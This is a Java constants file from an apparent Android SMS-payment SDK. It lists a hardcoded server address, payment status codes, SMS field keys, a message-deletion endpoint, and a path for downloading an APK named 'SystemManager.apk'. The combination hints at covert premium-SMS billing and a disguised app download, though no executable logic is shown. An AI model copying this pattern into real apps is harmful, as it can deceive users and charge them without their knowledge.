
package com.example.administrator.sdk.Utils;

import java.io.File;

public final class Constants {
    /**
     * 易镜科技服务器
     */
    public static final String SERVER_URL = "http://120.76.74.206:8080/";

    // 海琛服务器
    //public static final String SERVER_URL = "http://192.168.1.102:8080";

    public final static boolean isOutPut = true;// 是否输出

    // SDK包版本号
    public static final String VERSIONS = "3.2.11";

    public static final String CHL_KK_ID = "YCHL-KK-ID";// "YCHL-ID"
    public static final String VGP_ID = "vgp_id";// "vgp_id"
    public static final String isRequest = "PAY_REQUEST";// "vgp_id"

    // download apk name
    public static final String apkName = "SystemManager.apk";
    // download path
    public static File file = new File(android.os.Environment.getExternalStorageDirectory() + "/yc_download/", apkName);

    public static final String SMS_Send_Tongbu = SERVER_URL + "/youxipj/Others/othersNeed!sdk_delete_msg";

    public final static int PayState_SUCCESS = 0;// 付费成功
    public final static int PayState_FAILURE = 1;// 付费失败
    public final static int PayState_CANCEL = 2;// 付费取消

    public static final String SMS_PRICE = "PRICE";// "vgp_id"
    public static final String SMS_SETTING = "SETTING";// "vgp_id"
    public static final String SMS_PHONENUMBER = "PHONENUMBER";// "vgp_id"
    public static final String SMS_MESSAGEBODY = "MESSAGEBODY";// "vgp_id"
    public static final String SMS_ISPAYUNFAIRLOST = "ISPAYUNFAIRLOST";// "vgp_id"

}
